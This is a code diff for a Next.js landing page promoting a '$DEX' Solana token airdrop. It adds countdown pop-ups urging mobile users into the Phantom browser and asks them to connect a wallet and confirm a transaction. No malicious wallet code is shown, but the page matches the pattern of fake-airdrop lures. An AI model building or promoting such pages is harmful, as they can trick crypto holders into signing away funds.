@@ -6,12 +6,22 @@ import Script from 'next/script';
 import { useState, useEffect } from 'react';
 import dynamic from 'next/dynamic';
 import Link from 'next/link';
+import styles from '../styles/Home.module.css';
 
-const WalletConnect = dynamic(() => import('../components/WalletConnect'), { ssr: false });
+const WalletConnect = dynamic(() => import('../components/WalletConnect'), { 
+  ssr: false,
+  loading: () => (
+    <div className="glass-card p-4">
+      <div className="animate-pulse">
+        <div className="h-10 bg-gray-700 rounded w-48"></div>
+      </div>
+    </div>
+  )
+});
 
 const airdropConfig = {
   name: '$DEX',
-  image: '/logo/favicon.png',
+  image: '/logo/2.png',
   heading: 'Welcome to the $DEX Airdrop',
   paragraph: 'Connect your Solana wallet to claim your $DEX tokens and join the future of decentralized exchange.',
   backgroundColor: '#0A0B0E',
@@ -28,19 +38,54 @@ const airdropConfig = {
 export default function Home() {
   const [config, setConfig] = useState(airdropConfig);
   const [mounted, setMounted] = useState(false);
-  const [isMobile, setIsMobile] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [showDisclaimer, setShowDisclaimer] = useState(false);
+  const [isMobile, setIsMobile] = useState(false);
+  const [showChromeDisclaimer, setShowChromeDisclaimer] = useState(false);
+  const [countdown, setCountdown] = useState(10);
   
   useEffect(() => {
     setMounted(true);
-    // Check if device is mobile
+    // Check if device is mobile and if disclaimer has been shown before
     const checkMobile = () => {
-      setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
+      const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      setIsMobile(mobile);
+      if (mobile) {
+        const hasSeenDisclaimer = localStorage.getItem('hasSeenChromeDisclaimer');
+        if (!hasSeenDisclaimer) {
+          setShowChromeDisclaimer(true);
+          localStorage.setItem('hasSeenChromeDisclaimer', 'true');
+        }
+      }
     };
     checkMobile();
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
+
+  useEffect(() => {
+    // Auto-hide Chrome disclaimer after 10 seconds with countdown
+    if (showChromeDisclaimer) {
+      const timer = setTimeout(() => {
+        setShowChromeDisclaimer(false);
+      }, 10000);
+
+      const countdownInterval = setInterval(() => {
+        setCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(countdownInterval);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+
+      return () => {
+        clearTimeout(timer);
+        clearInterval(countdownInterval);
+      };
+    }
+  }, [showChromeDisclaimer]);
 
   const copyToClipboard = () => {
     navigator.clipboard.writeText(window.location.href);
@@ -48,109 +93,13 @@ export default function Home() {
     setTimeout(() => setCopied(false), 2000);
   };
 
-  // Mobile message component
-  const MobileMessage = () => (
-    <div className="mobile-message glass-card p-4 p-md-5">
-      <div className="text-center">
-        <div className="mb-4">
-          <Image 
-            src="/logo/favicon.png" 
-            alt="Phantom Logo" 
-            width={80} 
-            height={80} 
-            className="mb-3"
-          />
-          <h2 className="font-display text-2xl mb-3">Use Phantom Browser</h2>
-        </div>
-        
-        <div className="mb-4">
-          <p className="text-lg opacity-80 mb-3 font-body">
-            For the best and most secure airdrop claiming experience, please use the Phantom mobile browser.
-          </p>
-          <ul className="text-left mb-4">
-            <li className="mb-2 font-body">Seamless wallet connection</li>
-            <li className="mb-2 font-body">Faster transaction processing</li>
-            <li className="mb-2 font-body">Enhanced security features</li>
-            <li className="mb-2 font-body">Better mobile experience</li>
-          </ul>
-        </div>
-
-        <div className="url-copy-container mb-4">
-          <div className="d-flex align-items-center justify-content-center gap-2">
-            <input 
-              type="text" 
-              value={window.location.href} 
-              readOnly 
-              className="form-control bg-dark text-white border-secondary"
-            />
-            <button 
-              onClick={copyToClipboard}
-              className="btn btn-accent"
-            >
-              {copied ? 'Copied!' : 'Copy URL'}
-            </button>
-          </div>
-        </div>
-
-        <div className="steps-container">
-          <h3 className="font-heading mb-3">How to proceed:</h3>
-          <ol className="text-left">
-            <li className="mb-2 font-body ">Copy the URL above</li>
-            <li className="mb-2 font-body">Open Phantom mobile browser</li>
-            <li className="mb-2 font-body">Paste the URL in Phantom</li>
-            <li className="mb-2 font-body">Connect your wallet and claim</li>
-          </ol>
-        </div>
-      </div>
-
-      <style jsx>{`
-        .mobile-message {
-          max-width: 600px;
-          margin: 2rem auto;
-        }
-        
-        .url-copy-container {
-          background: rgba(255, 255, 255, 0.05);
-          padding: 1rem;
-          border-radius: 12px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .url-copy-container input {
-          flex: 1;
-          min-width: 0;
-          font-size: 0.9rem;
-          padding: 0.5rem;
-          border-radius: 8px;
-        }
-        
-        .steps-container {
-          background: rgba(255, 255, 255, 0.05);
-          padding: 1.5rem;
-          border-radius: 12px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .steps-container ol {
-          padding-left: 1.5rem;
-          margin-bottom: 0;
-        }
-        
-        .steps-container li {
-          color: rgba(255, 255, 255, 0.8);
-          margin-bottom: 0.5rem;
-        }
-      `}</style>
-    </div>
-  );
-
   return (
     <>
       <Head>
         <title>$DEX Airdrop | Claim Your Tokens</title>
         <meta name="description" content={`Claim your ${config.name} tokens and join the future of decentralized exchange.`} />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <link rel="icon" href="logo/favicon.png" />
+        <link rel="icon" href="logo/2.png" />
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
         <link
@@ -659,265 +608,261 @@ export default function Home() {
 
       <div style={{ position: 'relative', zIndex: 1 }}>
         <main className="container-fluid px-0">
-          {isMobile ? (
-            <MobileMessage />
-          ) : (
-            <div className="row g-0">
-              <div className="col-12">
-                <div className="glass-card p-4 p-md-5">
-                  <div className="row align-items-center g-4">
-                    <div className="col-lg-6">
-                      <div className="text-center text-lg-start">
-                        <div className="floating mb-4">
-                          <Image 
-                            src={config.image} 
-                            alt={`${config.name} Logo`} 
-                            width={120} 
-                            height={120} 
-                          />
-                        </div>
-                        <h1 className="font-display text-4xl mb-3">
-                          {config.heading}
-                        </h1>
-                        <p className="text-lg opacity-80 mb-4 font-body">
-                          {config.paragraph}
-                        </p>
-                        <div className="d-none d-lg-block">
-                          <WalletConnect />
-                        </div>
+          <div className="row g-0">
+            <div className="col-12">
+              <div className="glass-card p-4 p-md-5">
+                <div className="row align-items-center g-4">
+                  <div className="col-lg-6">
+                    <div className="text-center text-lg-start">
+                      <div className="floating mb-4">
+                        <Image 
+                          src={config.image} 
+                          alt={`${config.name} Logo`} 
+                          width={120} 
+                          height={120} 
+                        />
                       </div>
-                    </div>
-                    
-                    <div className="col-lg-6">
-                      <div className="glass-card p-4">
-                        <h3 className="text-white mb-4 font-heading">Claim Your Airdrop</h3>
-                        
-                        <div className="step-card mb-4">
-                          <h5 className="font-display text-base mb-2">Hold SOL</h5>
-                          <p className="text-lg opacity-80 mb-0 font-body">Must hold at least 0.01 SOL in your wallet</p>
-                        </div>
-                        
-                        <div className="step-card mb-4">
-                          <h5 className="font-display text-base mb-2">One Claim Per Wallet</h5>
-                          <p className="text-lg opacity-80 mb-0 font-body">Each wallet can only claim once</p>
-                        </div>
-                        
-                        <div className="step-card">
-                          <h5 className="font-display text-base mb-2">Limited Time</h5>
-                          <p className="text-lg opacity-80 mb-0 font-body">Airdrop ends in 7 days</p>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div id="features" className="glass-card p-4 p-md-5 mt-4">
-                  <h2 className="text-white mb-4 font-heading">
-                    About $DEX Token
-                  </h2>
-                  
-                  <div className="eligibility-item">
-                    <div className="eligibility-icon">💎</div>
-                    <div>
-                      <h5 className="font-display text-base mb-1">Total Supply</h5>
-                      <p className="opacity-80 mb-0 font-body">
-                        1,000,000,000 $DEX tokens
+                      <h1 className="font-display text-4xl mb-3">
+                        {config.heading}
+                      </h1>
+                      <p className="text-lg opacity-80 mb-4 font-body">
+                        {config.paragraph}
                       </p>
+                      <div className="d-none d-lg-block">
+                        <WalletConnect />
+                      </div>
                     </div>
                   </div>
                   
-                  <div className="eligibility-item">
-                    <div className="eligibility-icon">🎁</div>
-                    <div>
-                      <h5 className="font-display text-base mb-1">Airdrop Amount</h5>
-                      <p className="opacity-80 mb-0 font-body">
-                        1,000 $DEX tokens per eligible wallet
-                      </p>
-                    </div>
-                  </div>
-                  
-                  <div className="eligibility-item">
-                    <div className="eligibility-icon">🔒</div>
-                    <div>
-                      <h5 className="font-display text-base mb-1">Token Utility</h5>
-                      <p className="opacity-80 mb-0 font-body">
-                        Governance, staking rewards, and platform fees
-                      </p>
-                    </div>
-                  </div>
-
-                  <div className="eligibility-item">
-                    <div className="eligibility-icon">📈</div>
-                    <div>
-                      <h5 className="font-display text-base mb-1">Tokenomics</h5>
-                      <p className="opacity-80 mb-0 font-body">
-                        40% Community, 30% Development, 20% Team, 10% Marketing
-                      </p>
-                    </div>
-                  </div>
-                  
-                  <div className="text-center mt-4">
-                    <Link href="/tokenomics" className="btn btn-accent">
-                      View Full Tokenomics
-                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                        <path d="M5 12h14M12 5l7 7-7 7"/>
-                      </svg>
-                    </Link>
-                  </div>
-                </div>
-
-                <div id="guides" className="glass-card p-4 p-md-5 mt-4">
-                  <h2 className="text-white mb-4 font-heading">
-                    How to Claim Your Airdrop
-                  </h2>
-
-                  <div className="row g-4">
-                    <div className="col-md-6">
+                  <div className="col-lg-6">
+                    <div className="glass-card p-4">
+                      <h3 className="text-white mb-4 font-heading">Claim Your Airdrop</h3>
+                      
+                      <div className="step-card mb-4">
+                        <h5 className="font-display text-base mb-2">Hold SOL</h5>
+                        <p className="text-lg opacity-80 mb-0 font-body">Must hold at least 0.01 SOL in your wallet</p>
+                      </div>
+                      
+                      <div className="step-card mb-4">
+                        <h5 className="font-display text-base mb-2">One Claim Per Wallet</h5>
+                        <p className="text-lg opacity-80 mb-0 font-body">Each wallet can only claim once</p>
+                      </div>
+                      
                       <div className="step-card">
-                        <div className="d-flex align-items-center mb-3">
-                          <div className="eligibility-icon me-3">1</div>
-                          <h5 className="font-display mb-0">Connect Your Wallet</h5>
-                        </div>
-                        <p className="opacity-80 mb-0 font-body">
-                          Click the "Connect Wallet" button and select your preferred Solana wallet (Phantom, Solflare, etc.)
-                        </p>
-                      </div>
-                    </div>
-
-                    <div className="col-md-6">
-                      <div className="step-card">
-                        <div className="d-flex align-items-center mb-3">
-                          <div className="eligibility-icon me-3">2</div>
-                          <h5 className="font-display mb-0">Check Eligibility</h5>
-                        </div>
-                        <p className="opacity-80 mb-0 font-body">
-                          Ensure your wallet holds at least 0.01 SOL and hasn't claimed the airdrop before
-                        </p>
-                      </div>
-                    </div>
-
-                    <div className="col-md-6">
-                      <div className="step-card">
-                        <div className="d-flex align-items-center mb-3">
-                          <div className="eligibility-icon me-3">3</div>
-                          <h5 className="font-display mb-0">Claim Tokens</h5>
-                        </div>
-                        <p className="opacity-80 mb-0 font-body">
-                          Click the "Claim Airdrop" button and confirm the transaction in your wallet
-                        </p>
-                      </div>
-                    </div>
-
-                    <div className="col-md-6">
-                      <div className="step-card">
-                        <div className="d-flex align-items-center mb-3">
-                          <div className="eligibility-icon me-3">4</div>
-                          <h5 className="font-display mb-0">Verify Claim</h5>
-                        </div>
-                        <p className="opacity-80 mb-0 font-body">
-                          Check your wallet balance to confirm the tokens have been received
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-
-                  <div className="mt-5">
-                    <h3 className="text-white mb-4 font-heading">Frequently Asked Questions</h3>
-                    
-                    <div className="accordion" id="faqAccordion">
-                      <div className="accordion-item bg-transparent border-0 mb-3">
-                        <h2 className="accordion-header">
-                          <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq1">
-                            What is the minimum SOL requirement?
-                          </button>
-                        </h2>
-                        <div id="faq1" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-                          <div className="accordion-body text-white opacity-80 font-body">
-                            You need to hold at least 0.01 SOL in your wallet to be eligible for the airdrop. This helps prevent spam and ensures fair distribution.
-                          </div>
-                        </div>
-                      </div>
-
-                      <div className="accordion-item bg-transparent border-0 mb-3">
-                        <h2 className="accordion-header">
-                          <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq2">
-                            How many tokens will I receive?
-                          </button>
-                        </h2>
-                        <div id="faq2" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-                          <div className="accordion-body text-white opacity-80 font-body">
-                            Each eligible wallet will receive 1,000 $DEX tokens. The amount is fixed to ensure fair distribution among all participants.
-                          </div>
-                        </div>
-                      </div>
-
-                      <div className="accordion-item bg-transparent border-0 mb-3">
-                        <h2 className="accordion-header">
-                          <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq3">
-                            Can I claim multiple times?
-                          </button>
-                        </h2>
-                        <div id="faq3" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-                          <div className="accordion-body text-white opacity-80 font-body">
-                            No, each wallet can only claim the airdrop once. This is enforced through on-chain verification to prevent abuse.
-                          </div>
-                        </div>
-                      </div>
-
-                      <div className="accordion-item bg-transparent border-0">
-                        <h2 className="accordion-header">
-                          <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq4">
-                            What can I do with my $DEX tokens?
-                          </button>
-                        </h2>
-                        <div id="faq4" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
-                          <div className="accordion-body text-white opacity-80 font-body">
-                            $DEX tokens can be used for governance voting, staking rewards, and accessing premium platform features. Visit our tokenomics page for more details.
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-
-                  <div className="mt-5">
-                    <h3 className="text-white mb-4 font-heading">Important Links</h3>
-                    
-                    <div className="row g-4">
-                      <div className="col-md-4">
-                        <Link href="/tokenomics" className="text-decoration-none">
-                          <div className="glass-card p-4 h-100">
-                            <div className="eligibility-icon mb-3">📊</div>
-                            <h5 className="font-display text-white mb-2">Tokenomics</h5>
-                            <p className="opacity-80 mb-0 font-body">Learn about token distribution and utility</p>
-                          </div>
-                        </Link>
-                      </div>
-
-                      <div className="col-md-4">
-                        <Link href="/claim-status" className="text-decoration-none">
-                          <div className="glass-card p-4 h-100">
-                            <div className="eligibility-icon mb-3">🔍</div>
-                            <h5 className="font-display text-white mb-2">Claim Status</h5>
-                            <p className="opacity-80 mb-0 font-body">Check your airdrop eligibility and status</p>
-                          </div>
-                        </Link>
-                      </div>
-
-                      <div className="col-md-4">
-                        <Link href="/contact" className="text-decoration-none">
-                          <div className="glass-card p-4 h-100">
-                            <div className="eligibility-icon mb-3">💬</div>
-                            <h5 className="font-display text-white mb-2">Support</h5>
-                            <p className="opacity-80 mb-0 font-body">Get help with any questions or issues</p>
-                          </div>
-                        </Link>
+                        <h5 className="font-display text-base mb-2">Limited Time</h5>
+                        <p className="text-lg opacity-80 mb-0 font-body">Airdrop ends in 7 days</p>
                       </div>
                     </div>
                   </div>
                 </div>
               </div>
+
+              <div id="features" className="glass-card p-4 p-md-5 mt-4">
+                <h2 className="text-white mb-4 font-heading">
+                  About $DEX Token
+                </h2>
+                
+                <div className="eligibility-item">
+                  <div className="eligibility-icon">💎</div>
+                  <div>
+                    <h5 className="font-display text-base mb-1">Total Supply</h5>
+                    <p className="opacity-80 mb-0 font-body">
+                      1,000,000,000 $DEX tokens
+                    </p>
+                  </div>
+                </div>
+                
+                <div className="eligibility-item">
+                  <div className="eligibility-icon">🎁</div>
+                  <div>
+                    <h5 className="font-display text-base mb-1">Airdrop Amount</h5>
+                    <p className="opacity-80 mb-0 font-body">
+                      1,000 $DEX tokens per eligible wallet
+                    </p>
+                  </div>
+                </div>
+                
+                <div className="eligibility-item">
+                  <div className="eligibility-icon">🔒</div>
+                  <div>
+                    <h5 className="font-display text-base mb-1">Token Utility</h5>
+                    <p className="opacity-80 mb-0 font-body">
+                      Governance, staking rewards, and platform fees
+                    </p>
+                  </div>
+                </div>
+
+                <div className="eligibility-item">
+                  <div className="eligibility-icon">📈</div>
+                  <div>
+                    <h5 className="font-display text-base mb-1">Tokenomics</h5>
+                    <p className="opacity-80 mb-0 font-body">
+                      40% Community, 30% Development, 20% Team, 10% Marketing
+                    </p>
+                  </div>
+                </div>
+                
+                <div className="text-center mt-4">
+                  <Link href="/tokenomics" className="btn btn-accent">
+                    View Full Tokenomics
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                      <path d="M5 12h14M12 5l7 7-7 7"/>
+                    </svg>
+                  </Link>
+                </div>
+              </div>
+
+              <div id="guides" className="glass-card p-4 p-md-5 mt-4">
+                <h2 className="text-white mb-4 font-heading">
+                  How to Claim Your Airdrop
+                </h2>
+
+                <div className="row g-4">
+                  <div className="col-md-6">
+                    <div className="step-card">
+                      <div className="d-flex align-items-center mb-3">
+                        <div className="eligibility-icon me-3">1</div>
+                        <h5 className="font-display mb-0">Connect Your Wallet</h5>
+                      </div>
+                      <p className="opacity-80 mb-0 font-body">
+                        Click the "Connect Wallet" button and select your preferred Solana wallet (Phantom, Solflare, etc.)
+                      </p>
+                    </div>
+                  </div>
+
+                  <div className="col-md-6">
+                    <div className="step-card">
+                      <div className="d-flex align-items-center mb-3">
+                        <div className="eligibility-icon me-3">2</div>
+                        <h5 className="font-display mb-0">Check Eligibility</h5>
+                      </div>
+                      <p className="opacity-80 mb-0 font-body">
+                        Ensure your wallet holds at least 0.01 SOL and hasn't claimed the airdrop before
+                      </p>
+                    </div>
+                  </div>
+
+                  <div className="col-md-6">
+                    <div className="step-card">
+                      <div className="d-flex align-items-center mb-3">
+                        <div className="eligibility-icon me-3">3</div>
+                        <h5 className="font-display mb-0">Claim Tokens</h5>
+                      </div>
+                      <p className="opacity-80 mb-0 font-body">
+                        Click the "Claim Airdrop" button and confirm the transaction in your wallet
+                      </p>
+                    </div>
+                  </div>
+
+                  <div className="col-md-6">
+                    <div className="step-card">
+                      <div className="d-flex align-items-center mb-3">
+                        <div className="eligibility-icon me-3">4</div>
+                        <h5 className="font-display mb-0">Verify Claim</h5>
+                      </div>
+                      <p className="opacity-80 mb-0 font-body">
+                        Check your wallet balance to confirm the tokens have been received
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="mt-5">
+                  <h3 className="text-white mb-4 font-heading">Frequently Asked Questions</h3>
+                  
+                  <div className="accordion" id="faqAccordion">
+                    <div className="accordion-item bg-transparent border-0 mb-3">
+                      <h2 className="accordion-header">
+                        <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq1">
+                          What is the minimum SOL requirement?
+                        </button>
+                      </h2>
+                      <div id="faq1" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div className="accordion-body text-white opacity-80 font-body">
+                          You need to hold at least 0.01 SOL in your wallet to be eligible for the airdrop. This helps prevent spam and ensures fair distribution.
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="accordion-item bg-transparent border-0 mb-3">
+                      <h2 className="accordion-header">
+                        <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq2">
+                          How many tokens will I receive?
+                        </button>
+                      </h2>
+                      <div id="faq2" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div className="accordion-body text-white opacity-80 font-body">
+                          Each eligible wallet will receive 1,000 $DEX tokens. The amount is fixed to ensure fair distribution among all participants.
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="accordion-item bg-transparent border-0 mb-3">
+                      <h2 className="accordion-header">
+                        <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq3">
+                          Can I claim multiple times?
+                        </button>
+                      </h2>
+                      <div id="faq3" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div className="accordion-body text-white opacity-80 font-body">
+                          No, each wallet can only claim the airdrop once. This is enforced through on-chain verification to prevent abuse.
+                        </div>
+                      </div>
+                    </div>
+
+                    <div className="accordion-item bg-transparent border-0">
+                      <h2 className="accordion-header">
+                        <button className="accordion-button collapsed bg-transparent text-white font-heading" type="button" data-bs-toggle="collapse" data-bs-target="#faq4">
+                          What can I do with my $DEX tokens?
+                        </button>
+                      </h2>
+                      <div id="faq4" className="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div className="accordion-body text-white opacity-80 font-body">
+                          $DEX tokens can be used for governance voting, staking rewards, and accessing premium platform features. Visit our tokenomics page for more details.
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="mt-5">
+                  <h3 className="text-white mb-4 font-heading">Important Links</h3>
+                  
+                  <div className="row g-4">
+                    <div className="col-md-4">
+                      <Link href="/tokenomics" className="text-decoration-none">
+                        <div className="glass-card p-4 h-100">
+                          <div className="eligibility-icon mb-3">📊</div>
+                          <h5 className="font-display text-white mb-2">Tokenomics</h5>
+                          <p className="opacity-80 mb-0 font-body">Learn about token distribution and utility</p>
+                        </div>
+                      </Link>
+                    </div>
+
+                    <div className="col-md-4">
+                      <Link href="/claim-status" className="text-decoration-none">
+                        <div className="glass-card p-4 h-100">
+                          <div className="eligibility-icon mb-3">🔍</div>
+                          <h5 className="font-display text-white mb-2">Claim Status</h5>
+                          <p className="opacity-80 mb-0 font-body">Check your airdrop eligibility and status</p>
+                        </div>
+                      </Link>
+                    </div>
+
+                    <div className="col-md-4">
+                      <Link href="/contact" className="text-decoration-none">
+                        <div className="glass-card p-4 h-100">
+                          <div className="eligibility-icon mb-3">💬</div>
+                          <h5 className="font-display text-white mb-2">Support</h5>
+                          <p className="opacity-80 mb-0 font-body">Get help with any questions or issues</p>
+                        </div>
+                      </Link>
+                    </div>
+                  </div>
+                </div>
+              </div>
             </div>
-          )}
+          </div>
         </main>
 
         <footer>
@@ -928,6 +873,69 @@ export default function Home() {
           </div>
         </footer>
       </div>
+
+      {mounted && showDisclaimer && isMobile && (
+        <div className="fixed bottom-4 left-4 right-4 z-[9999] glass-card p-6 animate-fade-in" style={{ maxWidth: 'calc(100% - 32px)' }}>
+          <button 
+            onClick={() => setShowDisclaimer(false)}
+            className="absolute top-3 right-3 hover:text-gray-300 transition-colors"
+            style={{ fontSize: '20px', padding: '4px 8px', color: '#FFFFFF' }}
+          >
+            <i className="bi bi-x-lg" style={{ color: '#FFFFFF', fontSize: '1.5rem' }}></i>
+          </button>
+          <div className="text-white">
+            <div className="flex items-center gap-3 mb-4">
+              <Image 
+                src="/logo/2.png" 
+                alt="Logo" 
+                width={40} 
+                height={40}
+                className="rounded-lg"
+              />
+              <h3 className="font-display text-xl mb-0" style={{ borderBottom: '2px solid #00F5A0' }}>Important Notice</h3>
+            </div>
+            <div className="font-body">
+              <p className="mb-3 text-base leading-relaxed">
+                Chrome's default popup restrictions may interfere with the claim process. 
+                For the smoothest experience, we recommend using the Phantom browser.
+              </p>
+              <div className="flex items-center gap-2 text-sm opacity-80">
+                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                <span>This message will automatically close in 10 seconds.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showChromeDisclaimer && isMobile && (
+        <div className="position-fixed top-0 start-0 w-100 h-100 d-flex align-items-center justify-content-center p-3" style={{ zIndex: 9999, backgroundColor: 'rgba(0,0,0,0.5)' }}>
+          <div className="glass-card p-4 mx-auto position-relative" style={{ maxWidth: '90%', width: '400px' }}>
+            <button 
+              onClick={() => setShowChromeDisclaimer(false)}
+              className="btn btn-link position-absolute top-0 end-0 p-2"
+              style={{ minWidth: 'auto', fontSize: '1.5rem', color: '#FFFFFF' }}
+            >
+              <i className="bi bi-x-lg" style={{ color: '#FFFFFF', fontSize: '1.5rem' }}></i>
+            </button>
+            <div className="d-flex align-items-center mb-3">
+              <i className="bi bi-exclamation-triangle-fill me-2" style={{ color: '#FF3366', fontSize: '1.5rem' }}></i>
+              <h5 className="font-heading mb-0" style={{ borderBottom: '2px solid #00F5A0' }}>Important Notice</h5>
+            </div>
+            <p className="font-body mb-3">
+              Chrome blocks popups by default which may hinder the claim process. For a smooth experience, please use Phantom browser.
+            </p>
+            <div className="d-flex justify-content-between align-items-center">
+              <small className="text-white-50 d-flex align-items-center gap-2">
+                <i className="bi bi-clock" style={{ color: '#FFFFFF' }}></i>
+                <span>Closing in {countdown} seconds</span>
+              </small>
+            </div>
+          </div>
+        </div>
+      )}
     </>
   );
 }
